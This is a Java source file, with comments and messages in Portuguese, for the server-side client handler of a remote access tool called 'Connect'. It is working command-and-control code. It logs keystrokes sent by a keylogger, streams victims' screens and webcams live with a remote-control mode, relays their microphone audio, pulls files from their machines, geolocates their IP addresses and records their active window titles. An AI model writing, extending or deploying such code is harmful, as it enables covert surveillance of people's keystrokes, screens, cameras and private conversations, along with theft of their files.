package br.com.introcdc.connect.server.connection;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 18:10
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.server.ConnectServer;
import br.com.introcdc.connect.server.ConnectServerGUI;
import br.com.introcdc.connect.server.components.ServerAudioComponents;
import br.com.introcdc.connect.server.components.ServerControlComponents;
import br.com.introcdc.connect.server.components.ServerImageComponents;
import com.google.gson.JsonObject;

import javax.imageio.ImageIO;
import javax.sound.sampled.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class ClientHandler implements Runnable {

    private final Socket clientSocket;
    private final int clientId;
    private String clientKey;
    private PrintWriter writer;
    private final String clientIp;
    private String installDate = "00/00/0000 - 00:00:00";
    private String clientName = "Desconhecido";
    private String location = "Não localizado";
    private String os = "Desconhecido";
    private String activeWindow = "Desconhecido";
    private boolean webcamLive = false;
    private boolean screenLive = false;
    private ServerSocket webcamSocket;
    private ServerSocket screenSocket;
    private ServerSocket audioUserSocket;
    private ServerSocket audioServerSocket;
    private ServerSocket viewSocket;
    private ServerSocket fileSocket;
    private long pingTest = 0L;
    private boolean loaded = false;
    private long screenMillis = 0L;
    private long webcamMillis = 0L;
    private boolean auth = false;
    private int screens = 0;
    private int webcams = 0;
    private long ping = 0;

    private BufferedImage screenImage;
    private BufferedImage webcamImage;

    public JFrame CHAT_FRAME;
    public JTextArea CHAT_TEXT;
    public JTextField CHAT_FIELD;
    public List<String> CHAT_MESSAGES = new ArrayList<>();

    public ClientHandler(Socket socket, int id) {
        this.clientSocket = socket;
        this.clientId = id;
        this.clientIp = clientSocket.getInetAddress().toString();
        this.location = ipLocation(this.clientIp);
        ConnectServer.msg("Recebendo conexão #" + clientId + " (" + clientIp + "/" + this.location + ")...");
    }

    public Socket getClientSocket() {
        return clientSocket;
    }

    public int getClientId() {
        return clientId;
    }

    public String getClientIP() {
        return clientIp;
    }

    public String getClientName() {
        return clientName;
    }

    public String getClientInfo() {
        return "#" + getClientId() + " (" + getClientName() + getClientIP() + ")";
    }

    public String getClientKey() {
        return clientKey;
    }

    public void send(String message) {
        if (message.equalsIgnoreCase("ping")) {
            pingTest = System.currentTimeMillis();
        }
        if (this.writer != null) {
            this.writer.println(message);
            this.writer.flush();
        }
    }

    @Override
    public void run() {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
             PrintWriter writer = new PrintWriter(clientSocket.getOutputStream(), true)) {

            this.writer = writer;
            String command;
            while ((command = reader.readLine()) != null) {
                if (command.startsWith("key:")) {
                    clientKey = command.replace("key:", "");
                    if (ConnectServer.CONNECTED_KEYS.contains(clientKey)) {
                        if (ConnectServer.DISCONNECT_DUPLICATE) {
                            clientSocket.close();
                        }
                        continue;
                    }
                    loaded = true;
                    ConnectServer.CONNECTED_KEYS.add(clientKey);
                } else if (command.startsWith("user:")) {
                    clientName = command.replace("user:", "");
                    ConnectServer.msg("Conexão com cliente " + getClientInfo() + " estabelecida!");
                    auth = true;
                    ConnectServerGUI.addClientToTable(getClientKey(), null, null, getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                    ServerAudioComponents.generateBeep(100, 1500, true);
                } else if (!auth) {
                    closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + this.location + ")");
                    ServerAudioComponents.generateBeep(100, 250, true);
                    return;
                } else if (command.startsWith("date:")) {
                    installDate = command.replace("date:", "");
                } else if (command.startsWith("os:")) {
                    os = command.replace("os:", "");
                } else if (command.equalsIgnoreCase("ping")) {
                    ConnectServer.msg(getClientInfo() + ": " + (System.currentTimeMillis() - pingTest) + "ms");
                } else if (command.startsWith("chat-msg:")) {
                    String message = command.substring(9);
                    if (!message.isEmpty()) {
                        showChat(getClientInfo() + ": " + message);
                    }
                } else if (command.startsWith("chat-log:")) {
                    String message = command.substring(9);
                    if (!message.isEmpty()) {
                        showChat(message);
                    }
                } else if (command.equalsIgnoreCase("rping")) {
                    pingTest = System.currentTimeMillis();
                    send("r-ping");
                } else if (command.equalsIgnoreCase("r-ping")) {
                    ping = System.currentTimeMillis() - pingTest;
                    ConnectServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                } else if (command.startsWith("updateinfo ")) {
                    String[] args = command.split(" ", 4);
                    screens = Integer.parseInt(args[1]);
                    webcams = Integer.parseInt(args[2]);
                    activeWindow = args[3];
                    ConnectServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                } else if (command.startsWith("keylogger ")) {
                    ConnectServer.msg(getClientInfo() + ": Tecla: " + command.substring(10));
                } else if (command.equalsIgnoreCase("icon-screen") || command.equalsIgnoreCase("icon-webcam")) {
                    boolean webcam = command.equalsIgnoreCase("icon-webcam");
                    ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
                        boolean first = true;
                        JLabel label = null;
                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + 9)) {
                            try (Socket clientSocket = serverSocket.accept();
                                 InputStream is = clientSocket.getInputStream()) {
                                BufferedImage receivedImage = ImageIO.read(is);
                                if (webcam) {
                                    webcamImage = receivedImage;
                                } else {
                                    screenImage = receivedImage;
                                }
                                ConnectServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                            }
                        } catch (Exception exception) {
                            if (exception.getMessage() != null && exception.getMessage().equalsIgnoreCase("Socket closed")) {
                                return;
                            }
                            ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao abrir o servidor de icone");
                        }
                    }).start(), 1, TimeUnit.SECONDS);
                } else if (command.equalsIgnoreCase("screen-image") || command.equalsIgnoreCase("screen-live") ||
                        command.equalsIgnoreCase("webcam-image") || command.equalsIgnoreCase("webcam-live")
                        || command.equalsIgnoreCase("view-image")) {
                    String cmd = command;
                    boolean webcam = command.startsWith("webcam");
                    boolean view = command.equalsIgnoreCase("view-image");
                    ConnectServer.msg(getClientInfo() + ": Recebendo " + (cmd.contains("-live") ? "transmissão de " : "") +
                            (view ? "visualização de imagem" : webcam ? "webcam" : "tela") + " do cliente...");
                    if (!view) {
                        if (webcam && webcamSocket != null) {
                            webcamLive = cmd.contains("-live");
                            webcamSocket.close();
                        } else if (!webcam && screenSocket != null) {
                            screenLive = cmd.contains("-live");
                            screenSocket.close();
                        }
                    }
                    ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
                        boolean first = true;
                        JLabel label = null;
                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + (view ? 5 : webcam ? 2 : 1))) {
                            if (view) {
                                viewSocket = serverSocket;
                            } else if (webcam) {
                                webcamSocket = serverSocket;
                            } else {
                                screenSocket = serverSocket;
                            }
                            while (((webcam && webcamLive) || (!webcam && screenLive)) || first) {
                                try (Socket clientSocket = serverSocket.accept();
                                     InputStream is = clientSocket.getInputStream()) {

                                    if (cmd.contains("-live")) {
                                        BufferedImage receivedImage = ImageIO.read(is);
                                        if (first) {
                                            first = false;
                                            label = ServerImageComponents.openLiveImage(receivedImage, getClientInfo() + " (" + (webcam ? "Webcam" : "Screen") + ")",
                                                    " | 0/" + ServerImageComponents.FPS + " FPS" + (!webcam && screenLive && ServerControlComponents.CONTROL ?
                                                            " | CONTROLE REMOTO" : ""), !webcam);
                                            if (webcam) {
                                                webcamMillis = System.currentTimeMillis();
                                            } else {
                                                screenMillis = System.currentTimeMillis();
                                            }
                                        } else {
                                            if (label == null) {
                                                label = ServerImageComponents.openLiveImage(receivedImage, getClientInfo() + " (" + (webcam ? "Webcam" : "Screen") + ")",
                                                        " | 0/" + ServerImageComponents.FPS + " FPS" + (!webcam && screenLive && ServerControlComponents.CONTROL ?
                                                                " | CONTROLE REMOTO" : ""), !webcam);
                                            } else {
                                                ServerImageComponents.updateLiveImage(receivedImage, label);
                                            }
                                            long currentMillis = System.currentTimeMillis();
                                            long delta = currentMillis - (webcam ? webcamMillis : screenMillis);

                                            int updatesPerSecond = (int) (1000 / Math.max(delta, 1));
                                            JFrame frame;
                                            if (webcam) {
                                                frame = ServerImageComponents.WEBCAM_FRAME;
                                            } else {
                                                frame = ServerImageComponents.SCREEN_FRAME;
                                            }
                                            frame.setTitle(getClientInfo() + " (" + (webcam ? "Webcam" : "Screen") + ") (" + receivedImage.getWidth() +
                                                    " x " + receivedImage.getHeight() + ") | " + System.currentTimeMillis() + " | " + updatesPerSecond +
                                                    "/" + ServerImageComponents.FPS + " FPS" + (!webcam && screenLive && ServerControlComponents.CONTROL ? " | CONTROLE REMOTO" : ""));
                                            if (webcam) {
                                                webcamMillis = System.currentTimeMillis();
                                            } else {
                                                screenMillis = System.currentTimeMillis();
                                            }
                                        }
                                    } else {
                                        first = false;
                                        BufferedImage receivedImage = ImageIO.read(is);
                                        ServerImageComponents.openImage(receivedImage, getClientInfo() + " (" +
                                                (view ? "Visualização de Imagem" : webcam ? "Webcam" : "Screen") + ")");
                                    }
                                }
                            }
                        } catch (Exception exception) {
                            if (exception.getMessage() != null && exception.getMessage().equalsIgnoreCase("Socket closed")) {
                                return;
                            }
                            ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao abrir o servidor de receber arquivo");
                        }
                    }).start(), 1, TimeUnit.SECONDS);
                } else if (command.equalsIgnoreCase("audio-user") || command.equalsIgnoreCase("audio-server")) {
                    boolean fromUser = command.equalsIgnoreCase("audio-user");
                    ConnectServer.msg(getClientInfo() + ": Recebendo transmissão de áudio " + (fromUser ? "do cliente para o servidor" :
                            "do servidor para o cliente") + "...");
                    new Thread(() -> {
                        try {
                            SourceDataLine speakers = null;
                            TargetDataLine microphone = null;
                            if (fromUser) {
                                try {
                                    if (audioUserSocket != null) {
                                        audioUserSocket.close();
                                    }
                                } catch (Exception ignored) {
                                }
                                speakers = getSourceDataLine();
                                if (speakers == null) {
                                    ConnectServer.msg("Alto-falante do servidor não encontrado!");
                                    return;
                                }
                                ServerAudioComponents.AUDIO_USER = true;
                            } else {
                                try {
                                    if (audioServerSocket != null) {
                                        audioServerSocket.close();
                                    }
                                } catch (Exception ignored) {
                                }
                                microphone = getTargetDataLine();
                                if (microphone == null) {
                                    ConnectServer.msg("Microfone do servidor não encontrado!");
                                    return;
                                }
                                ServerAudioComponents.AUDIO_SERVER = true;
                            }

                            SourceDataLine speakersInfo = speakers;
                            TargetDataLine microphoneInfo = microphone;

                            new Thread(() -> {
                                try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + (fromUser ? 7 : 8))) {
                                    Socket clientSocket = serverSocket.accept();
                                    ConnectServer.msg(getClientInfo() + ": Transmissão de áudio estabelecida, executando...");

                                    if (fromUser) {
                                        audioUserSocket = serverSocket;
                                    } else {
                                        audioServerSocket = serverSocket;
                                    }

                                    try {
                                        if (fromUser) {
                                            InputStream in = clientSocket.getInputStream();

                                            byte[] buffer = new byte[4096];
                                            int bytesRead;
                                            if (ConnectServerGUI.AUDIO_USER != null) {
                                                ConnectServerGUI.AUDIO_USER.setBackground(Color.GREEN);
                                            }

                                            try {
                                                while (ServerAudioComponents.AUDIO_USER && (bytesRead = in.read(buffer)) != -1) {
                                                    speakersInfo.write(buffer, 0, bytesRead);
                                                }
                                            } catch (Exception exception) {
                                                ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na reprodução do servidor de áudio por parte do servidor do cliente para o servidor (" + exception.getMessage() + ")");
                                                if (ConnectServerGUI.AUDIO_USER != null) {
                                                    ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
                                                }
                                            } finally {
                                                speakersInfo.close();
                                                clientSocket.close();
                                                try {
                                                    serverSocket.close();
                                                } catch (Exception ignored) {
                                                }
                                                ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do cliente para o servidor finalizada");
                                                if (ConnectServerGUI.AUDIO_USER != null) {
                                                    ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
                                                }
                                            }
                                        } else {
                                            OutputStream out = clientSocket.getOutputStream();
                                            byte[] buffer = new byte[4096];

                                            if (ConnectServerGUI.AUDIO_SERVER != null) {
                                                ConnectServerGUI.AUDIO_SERVER.setBackground(Color.GREEN);
                                            }
                                            try {
                                                while (ServerAudioComponents.AUDIO_SERVER) {
                                                    int bytesRead = microphoneInfo.read(buffer, 0, buffer.length);
                                                    if (bytesRead == -1) break;
                                                    out.write(buffer, 0, bytesRead);
                                                }
                                            } catch (Exception exception) {
                                                ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na reprodução do servidor de áudio por parte do servidor do cliente para o servidor (" + exception.getMessage() + ")");
                                                if (ConnectServerGUI.AUDIO_SERVER != null) {
                                                    ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                                }
                                            } finally {
                                                microphoneInfo.close();
                                                clientSocket.close();
                                                ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do servidor para o cliente finalizada");
                                                try {
                                                    serverSocket.close();
                                                } catch (Exception ignored) {
                                                }
                                                if (ConnectServerGUI.AUDIO_SERVER != null) {
                                                    ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                                }
                                            }
                                        }
                                    } catch (Exception exception) {
                                        ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na execução do servidor de áudio por parte do servidor " + (fromUser ? "do cliente para o servidor" : "do servidor para o cliente") + " (" + exception.getMessage() + ")");
                                        if (fromUser) {
                                            try {
                                                if (audioUserSocket != null) {
                                                    audioUserSocket.close();
                                                }
                                            } catch (Exception ignored) {
                                            }
                                            try {
                                                speakersInfo.close();
                                            } catch (Exception ignored) {
                                            }
                                            if (ConnectServerGUI.AUDIO_USER != null) {
                                                ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
                                            }
                                        } else {
                                            try {
                                                if (audioServerSocket != null) {
                                                    audioServerSocket.close();
                                                }
                                            } catch (Exception ignored) {
                                            }
                                            try {
                                                microphoneInfo.close();
                                            } catch (Exception ignored) {
                                            }
                                            if (ConnectServerGUI.AUDIO_SERVER != null) {
                                                ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                            }
                                        }
                                    }
                                } catch (Exception exception) {
                                    if (exception.getMessage().equalsIgnoreCase("Socket closed")) {
                                        return;
                                    }
                                    ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na execução do servidor de áudio por parte do servidor " + (fromUser ? "do cliente para o servidor" : "do servidor para o cliente") + " (" + exception.getMessage() + ")");
                                    if (fromUser) {
                                        try {
                                            if (audioUserSocket != null) {
                                                audioUserSocket.close();
                                            }
                                        } catch (Exception ignored) {
                                        }
                                        try {
                                            speakersInfo.close();
                                        } catch (Exception ignored) {
                                        }
                                        if (ConnectServerGUI.AUDIO_USER != null) {
                                            ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
                                        }
                                    } else {
                                        try {
                                            if (audioServerSocket != null) {
                                                audioServerSocket.close();
                                            }
                                        } catch (Exception ignored) {
                                        }
                                        try {
                                            microphoneInfo.close();
                                        } catch (Exception ignored) {
                                        }
                                        if (ConnectServerGUI.AUDIO_SERVER != null) {
                                            ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                        }
                                    }
                                }
                            }).start();
                        } catch (Exception exception) {
                            ConnectServer.msg("Ocorreu um erro ao processar o servidor de áudio por parte do servidor! (" + exception.getMessage() + ")");
                            if (fromUser) {
                                try {
                                    if (audioUserSocket != null) {
                                        audioUserSocket.close();
                                    }
                                } catch (Exception ignored) {
                                }
                            } else {
                                try {
                                    if (audioServerSocket != null) {
                                        audioServerSocket.close();
                                    }
                                } catch (Exception ignored) {
                                }
                            }
                        }
                    }).start();
                } else if (command.startsWith("stoplivewebcam")) {
                    if (webcamLive) {
                        ConnectServer.msg(getClientInfo() + ": Transmissão da webcam finalizada! (" + command.replace("stoplivewebcam", "") + ")");
                    }
                    webcamLive = false;
                    if (ServerImageComponents.WEBCAM_STOP != null) {
                        ServerImageComponents.WEBCAM_STOP.setEnabled(false);
                        ServerImageComponents.WEBCAM_STOP.setText("Transmissão Parada");
                    }
                } else if (command.startsWith("stoplivescreen")) {
                    if (screenLive) {
                        ConnectServer.msg(getClientInfo() + ": Transmissão da tela finalizada! (" + command.replace("stoplivescreen", "") + ")");
                    }
                    screenLive = false;
                    if (ServerImageComponents.SCREEN_STOP != null) {
                        ServerImageComponents.SCREEN_STOP.setEnabled(false);
                        ServerImageComponents.SCREEN_STOP.setText("Transmissão Parada");
                    }
                } else if (command.startsWith("stopliveaudiouser")) {
                    if (ServerAudioComponents.AUDIO_USER) {
                        ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do usuário finalizada! (" + command.replace("stopliveaudiouser", "") + ")");
                    }
                    ServerAudioComponents.AUDIO_USER = false;
                    if (ConnectServerGUI.AUDIO_USER != null) {
                        ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
                    }
                } else if (command.startsWith("stopliveaudioserver")) {
                    if (ServerAudioComponents.AUDIO_SERVER) {
                        ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do servidor finalizada! (" + command.replace("stopliveaudioserver", "") + ")");
                    }
                    ServerAudioComponents.AUDIO_SERVER = false;
                    if (ConnectServerGUI.AUDIO_SERVER != null) {
                        ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                    }
                } else if (command.equalsIgnoreCase("receive-file")) {
                    ConnectServer.msg(getClientInfo() + ": Recebendo arquivo do cliente...");
                    ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + 3)) {
                            fileSocket = serverSocket;
                            try (Socket clientSocket = serverSocket.accept();
                                 DataInputStream dis = new DataInputStream(clientSocket.getInputStream());
                                 BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("connect/" + dis.readUTF()))) {

                                byte[] buffer = new byte[4096];
                                int bytesRead;
                                while ((bytesRead = dis.read(buffer)) != -1) {
                                    bos.write(buffer, 0, bytesRead);
                                }

                                ConnectServer.msg(getClientInfo() + ": Arquivo recebido!");
                            } catch (IOException exception) {
                                ConnectServer.msg(getClientInfo() + ": Erro ao receber arquivo - " + exception.getMessage());
                            }
                        } catch (IOException exception) {
                            ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao receber um arquivo do cliente");
                        }
                    }).start(), 100, TimeUnit.MILLISECONDS);
                } else {
                    ConnectServer.msg(getClientInfo() + ": " + command);
                    if (command.contains("Interfaces USB:") || command.contains("Separador de Linha:")) {
                        ConnectServer.msg(getClientInfo() + ": IP: " + getClientIP() + " (" + this.location + ")");
                    }
                }
            }
        } catch (Exception exception) {
            closeConnection(exception.getMessage());
            return;
        }
        closeConnection("Conexão Finalizada");
    }

    public String ipLocation(String ip) {
        if (getClientIP().equals("127.0.0.1") || getClientIP().startsWith("192.168.")) {
            return "IP Local";
        }
        try {
            JsonObject ipInfo = ServerControlComponents.readJson("http://ip-api.com/json/" + getClientIP()).getAsJsonObject();
            return ipInfo.get("city").getAsString() + "/" + ipInfo.get("regionName").getAsString() + "/" + ipInfo.get("country").getAsString();
        } catch (Exception exception) {
            return "Erro ao localizar ip: " + exception.getMessage();
        }
    }

    public void closeConnection(String message) {
        ConnectServer.msg("Cliente " + getClientInfo() + " desconectado. (" + message + ")");
        if (loaded) {
            ConnectServer.CONNECTED_KEYS.remove(getClientKey());
        }
        ConnectServer.CLIENTS.remove(getClientId());
        ConnectServerGUI.removeClientFromTable(getClientKey());

        // Remove o ID da combo na GUI
        ConnectServerGUI.removeClient(String.valueOf(getClientId()));

        webcamLive = false;
        screenLive = false;
        ServerAudioComponents.AUDIO_SERVER = false;
        ServerAudioComponents.AUDIO_USER = false;

        if (viewSocket != null) {
            try {
                viewSocket.close();
            } catch (IOException ignored) {
            }
        }
        if (webcamSocket != null) {
            try {
                webcamSocket.close();
            } catch (IOException ignored) {
            }
        }
        if (screenSocket != null) {
            try {
                screenSocket.close();
            } catch (IOException ignored) {
            }
        }
        if (fileSocket != null) {
            try {
                fileSocket.close();
            } catch (IOException ignored) {
            }
        }
        if (audioServerSocket != null) {
            try {
                audioServerSocket.close();
            } catch (IOException ignored) {
            }
        }
        if (audioUserSocket != null) {
            try {
                audioUserSocket.close();
            } catch (IOException ignored) {
            }
        }
        if (clientSocket != null) {
            try {
                clientSocket.close();
            } catch (IOException ignored) {
            }
        }
        if (ConnectServer.SELECTED_CLIENT == getClientId()) {
            ConnectServer.SELECTED_CLIENT = 0;
        }

        ServerAudioComponents.generateBeep(100, 1500, false);
        ServerAudioComponents.generateBeep(100, 1250, false);
        ServerAudioComponents.generateBeep(100, 1000, false);
        ServerAudioComponents.generateBeep(100, 750, false);
        ServerAudioComponents.generateBeep(100, 500, false);
        ServerAudioComponents.generateBeep(100, 250, false);
    }

    public static final AudioFormat FORMAT = new AudioFormat(44100, 16, 2, true, true);

    private static SourceDataLine getSourceDataLine() {
        try {
            DataLine.Info info = new DataLine.Info(SourceDataLine.class, FORMAT);
            if (!AudioSystem.isLineSupported(info)) {
                return null;
            }

            SourceDataLine line = (SourceDataLine) AudioSystem.getLine(info);
            line.open(FORMAT);
            line.start();
            return line;
        } catch (Exception exception) {
            ConnectServer.msg("Ocorreu um erro ao capturar a informação do alto-falante do servidor! (" + exception.getMessage() + ")");
            return null;
        }
    }

    private static TargetDataLine getTargetDataLine() {
        try {
            DataLine.Info info = new DataLine.Info(TargetDataLine.class, FORMAT);
            if (!AudioSystem.isLineSupported(info)) {
                return null;
            }

            TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info);
            line.open(FORMAT);
            line.start();
            return line;
        } catch (Exception exception) {
            ConnectServer.msg("Ocorreu um erro ao capturar a informação do microfone do servidor! (" + exception.getMessage() + ")");
        }
        return null;
    }

    public void showChat(String message) {
        if (CHAT_FRAME == null) {
            createChatFrame();
        }

        if (message != null && !message.isEmpty()) {
            addMessage(message);
        }

        if (!CHAT_FRAME.isVisible()) {
            CHAT_FRAME.setVisible(true);
        }
    }

    public void createChatFrame() {
        // Define ou não o modo escuro antes de setar o LookAndFeel
        if (ConnectServerGUI.DARK_MODE) {
            try {
                UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");

                // Ajustes de cor para o modo escuro via UIManager
                UIManager.put("control", new Color(60, 63, 65));
                UIManager.put("text", Color.WHITE);
                UIManager.put("nimbusBase", new Color(18, 30, 49));
                UIManager.put("nimbusFocus", new Color(115, 164, 209));
                UIManager.put("nimbusLightBackground", new Color(60, 63, 65));
                UIManager.put("info", new Color(60, 63, 65));
                UIManager.put("nimbusSelectionBackground", new Color(104, 93, 156));
                UIManager.put("nimbusSelectedText", Color.WHITE);
                UIManager.put("nimbusDisabledText", Color.GRAY);
                UIManager.put("OptionPane.background", new Color(60, 63, 65));
                UIManager.put("Panel.background", new Color(60, 63, 65));
                UIManager.put("TextField.background", new Color(69, 73, 74));
                UIManager.put("TextField.foreground", Color.WHITE);
                UIManager.put("TextArea.background", new Color(69, 73, 74));
                UIManager.put("TextArea.foreground", Color.WHITE);
                UIManager.put("ComboBox.background", new Color(69, 73, 74));
                UIManager.put("ComboBox.foreground", Color.WHITE);
                UIManager.put("Button.background", new Color(77, 77, 77));
                UIManager.put("Button.foreground", Color.WHITE);
            } catch (Exception ignored) {
            }
        } else {
            // Se não for dark mode, apenas aplica o Nimbus padrão (ou outro look que desejar)
            try {
                UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
            } catch (Exception ignored) {
            }
        }

        // Cria o frame
        CHAT_FRAME = new JFrame("Chat com " + getClientInfo());
        CHAT_FRAME.setSize(600, 500);
        CHAT_FRAME.setLocationRelativeTo(null);

        // Tenta definir um ícone para a janela
        try {
            ImageIcon icon = new ImageIcon(ClientHandler.class.getResource("/eye.png"));
            CHAT_FRAME.setIconImage(icon.getImage());
        } catch (Exception ignored) {
        }

        // Cria a área de texto (somente leitura)
        CHAT_TEXT = new JTextArea();
        CHAT_TEXT.setEditable(false);

        // Adiciona a área de texto em um JScrollPane
        JScrollPane scrollPane = new JScrollPane(CHAT_TEXT);
        scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

        // Painel de baixo (principal) usando BorderLayout
        JPanel bottomPanel = new JPanel(new BorderLayout());

        // Campo de texto para digitar mensagens
        CHAT_FIELD = new JTextField();

        // Botão "Enviar"
        JButton sendButton = new JButton("Enviar");
        ActionListener sendAction = event -> {
            String msg = CHAT_FIELD.getText().trim();
            if (!msg.isEmpty()) {
                send("chat " + msg);
                if (msg.equalsIgnoreCase(">")) {
                    addMessage("< CHAT DO USUÁRIO ABERTO >");
                } else if (msg.equalsIgnoreCase(">>")) {
                    addMessage("< CHAT DO USUÁRIO FECHADO >");
                } else if (msg.equalsIgnoreCase("clear")) {
                    addMessage("< CHAT DO USUÁRIO LIMPO >");
                } else {
                    addMessage("Você: " + msg);
                }
                CHAT_FIELD.setText("");
            }
        };
        // Liga a ação de enviar ao botão e ao Enter
        sendButton.addActionListener(sendAction);
        CHAT_FIELD.addActionListener(sendAction);

        // Botão "Abrir"
        JButton openChatButton = new JButton("Abrir");
        openChatButton.addActionListener(event -> {
            addMessage("< CHAT DO USUÁRIO ABERTO >");
            send("chat >");
        });

        // Botão "Fechar"
        JButton closeChatButton = new JButton("Fechar");
        closeChatButton.addActionListener(event -> {
            addMessage("< CHAT DO USUÁRIO FECHADO >");
            send("chat >>");
        });

        // Botão "Limpar"
        JButton clearChatButton = new JButton("Limpar");
        clearChatButton.addActionListener(event -> {
            addMessage("< CHAT DO USUÁRIO LIMPO >");
            send("chat clear");
        });

        // Subpainel para agrupar os 3 botões
        JPanel buttonsPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 5));
        buttonsPanel.add(sendButton);
        buttonsPanel.add(openChatButton);
        buttonsPanel.add(clearChatButton);
        buttonsPanel.add(closeChatButton);

        // Adiciona o campo de texto no centro e o subpainel de botões à direita
        bottomPanel.add(CHAT_FIELD, BorderLayout.CENTER);
        bottomPanel.add(buttonsPanel, BorderLayout.EAST);

        // Adiciona tudo ao frame principal
        CHAT_FRAME.setLayout(new BorderLayout());
        CHAT_FRAME.add(scrollPane, BorderLayout.CENTER);
        CHAT_FRAME.add(bottomPanel, BorderLayout.SOUTH);

        // Atualiza a área de texto com mensagens antigas (se houver)
        updateTextArea();

        // Caso o DARK_MODE esteja habilitado, forçamos a atualização do look
        if (ConnectServerGUI.DARK_MODE) {
            SwingUtilities.updateComponentTreeUI(CHAT_FRAME);
        }

        CHAT_FRAME.setVisible(true);
    }

    public void addMessage(String message) {
        ConnectServer.msg((message.startsWith(getClientInfo() + ": ") ? "" : getClientInfo() + ": ") + message);
        CHAT_MESSAGES.add(message);
        updateTextArea();
    }

    public void updateTextArea() {
        CHAT_TEXT.setText("");
        for (String m : CHAT_MESSAGES) {
            CHAT_TEXT.append(m + "\n");
        }

        CHAT_TEXT.setCaretPosition(CHAT_TEXT.getDocument().getLength());
    }

    public static void handleChat(String input) {
        if (ConnectServer.SELECTED_CLIENT == -1) {
            if (ConnectServer.CLIENTS.isEmpty()) {
                ConnectServer.msg("Não possui nenhum cliente conectado no momento!");
            } else {
                if (input.equalsIgnoreCase("<")) {
                    for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                        clientHandler.showChat(null);
                    }
                } else {
                    if (input.equalsIgnoreCase(">")) {
                        ConnectServer.msg("Abrindo o chat para " + ConnectServer.CLIENTS.size() + " clientes!");
                        for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                            clientHandler.showChat("< CHAT DO USUÁRIO ABERTO >");
                            clientHandler.send("chat >");
                        }
                    } else if (input.equalsIgnoreCase(">>")) {
                        ConnectServer.msg("Fechando o chat para " + ConnectServer.CLIENTS.size() + " clientes!");
                        for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                            clientHandler.showChat("< CHAT DO USUÁRIO FECHADO >");
                            clientHandler.send("chat >>");
                        }
                    } else if (input.equalsIgnoreCase("clear")) {
                        ConnectServer.msg("Limpando o chat para " + ConnectServer.CLIENTS.size() + " clientes!");
                        for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                            clientHandler.showChat("< CHAT DO USUÁRIO LIMPO >");
                            clientHandler.send("chat clear");
                        }
                    } else {
                        ConnectServer.msg("Enviando a mensagem via chat \"" + input + "\" para " + ConnectServer.CLIENTS.size() + " clientes!");
                        for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                            clientHandler.showChat("Você: " + input);
                            clientHandler.send("chat " + input);
                        }
                    }
                }
            }
        } else {
            ClientHandler client = ConnectServer.CLIENTS.get(ConnectServer.SELECTED_CLIENT);
            if (input.equalsIgnoreCase("<")) {
                client.showChat(null);
            } else {
                if (input.equalsIgnoreCase(">")) {
                    client.showChat("< CHAT DO USUÁRIO ABERTO >");
                } else if (input.equalsIgnoreCase(">>")) {
                    client.showChat("< CHAT DO USUÁRIO FECHADO >");
                } else if (input.equalsIgnoreCase("clear")) {
                    client.showChat("< CHAT DO USUÁRIO LIMPO >");
                } else {
                    client.showChat("Você: " + input);
                }
                client.send("chat " + input);
            }
        }
    }

}
